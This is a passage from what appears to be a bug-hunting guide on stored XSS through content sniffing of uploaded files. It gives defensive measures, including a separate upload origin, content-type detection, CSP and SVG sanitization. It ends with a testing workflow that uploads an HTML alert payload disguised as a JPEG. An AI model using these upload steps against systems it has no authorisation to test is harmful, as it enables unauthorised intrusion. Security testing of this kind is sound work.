  Content-Disposition: attachment; filename="user_upload.jpg"
  ```
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Separate Origin for Uploads
  ---
  Serve user uploads from a different domain (e.g., `uploads.target-cdn.com`) with no cookies. Even if content sniffing XSS executes, it cannot access the main application's cookies, localStorage, or session data due to Same-Origin Policy.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Correct Content-Type from Content
  ---
  Determine Content-Type from actual file content using server-side libraries (`python-magic`, `finfo_file()`, `ImageIO`), not from the extension or client-provided header. Serve with the correctly detected type.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: CSP on Upload Endpoints
  ---
  Add a restrictive Content-Security-Policy specifically for upload-serving endpoints that blocks all script execution:

  ```text
  Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; img-src 'self'
  ```
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: SVG Sanitization
  ---
  If SVG uploads are allowed, sanitize them by removing all `<script>` elements, event handler attributes (`onload`, `onerror`, etc.), `<foreignObject>` elements, and external entity references. Libraries like DOMPurify can sanitize SVG safely.
  :::
::

---

## Bug Hunting Workflow Summary

::steps{level="4"}

#### Check nosniff on all upload paths
```bash
curl -sI https://target.com/uploads/ | grep -i x-content-type-options
```

#### Upload HTML as image
```bash
echo '<script>alert(document.domain)</script>' > test.jpg
curl -X POST URL -F "file=@test.jpg;type=image/jpeg" -H "Cookie: session=TOKEN"
```

#### Open uploaded URL in browser
Check if HTML renders instead of showing broken image. Test in Chrome, Firefox, Safari, and IE11.

#### Verify JavaScript execution
If alert fires → Stored XSS via content sniffing confirmed. Document browser, URL, and headers.

#### Write report
Include: missing header evidence, upload steps, browser screenshot, affected browsers, remediation guidance.

::